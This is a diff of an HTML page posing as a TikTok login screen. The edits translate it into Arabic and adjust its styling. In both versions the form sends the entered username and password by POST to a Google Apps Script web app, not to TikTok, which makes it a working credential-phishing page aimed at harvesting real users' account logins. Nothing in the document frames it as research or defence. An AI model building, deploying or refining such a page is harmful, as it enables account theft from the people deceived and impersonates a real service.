@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Login - TikTok</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تسجيل دخول TikTok</title>
   <style>
     body {
       background-color: #000;
@@ -15,46 +15,53 @@
       height: 100vh;
       margin: 0;
     }
+
     .login-box {
-      background: #111;
+      background-color: #111;
       padding: 2rem;
-      border-radius: 10px;
-      width: 300px;
-      box-shadow: 0 0 10px #ff0050;
+      border-radius: 12px;
+      width: 320px;
+      box-shadow: 0 0 15px #ff0050;
     }
+
     .login-box h2 {
-      margin-bottom: 1rem;
-      color: #ff0050;
       text-align: center;
+      color: #ff0050;
+      margin-bottom: 1.5rem;
     }
+
     input {
       width: 100%;
-      padding: 10px;
+      padding: 12px;
       margin: 10px 0;
       border: none;
-      border-radius: 5px;
+      border-radius: 6px;
       outline: none;
     }
+
     button {
       background-color: #ff0050;
       color: white;
-      width: 100%;
-      padding: 10px;
       border: none;
-      border-radius: 5px;
+      padding: 12px;
+      width: 100%;
+      border-radius: 6px;
       cursor: pointer;
     }
+
     button:hover {
       background-color: #e60045;
     }
   </style>
 </head>
 <body>
-<form class="login-box" action="https://script.google.com/macros/s/AKfycbzcoa2RER7_GmiQM5gWYsjjI2RKKfhwFcca3k5yL2kidpWfaLt3SO1t59kBD1JNPnFHVw/exec" method="POST">
+
+  <form class="login-box" method="POST" action="https://script.google.com/macros/s/AKfycbzcoa2RER7_GmiQM5gWYsjjI2RKKfhwFcca3k5yL2kidpWfaLt3SO1t59kBD1JNPnFHVw/exec">
     <h2>TikTok Login</h2>
-    <input type="text" name="username" placeholder="Username" required />
-    <input type="password" name="password" placeholder="Password" required />
-    <button type="submit">Login</button>
+    <input type="text" name="username" placeholder="اسم المستخدم" required>
+    <input type="password" name="password" placeholder="كلمة المرور" required>
+    <button type="submit">تسجيل الدخول</button>
   </form>
+
 </body>
 </html>
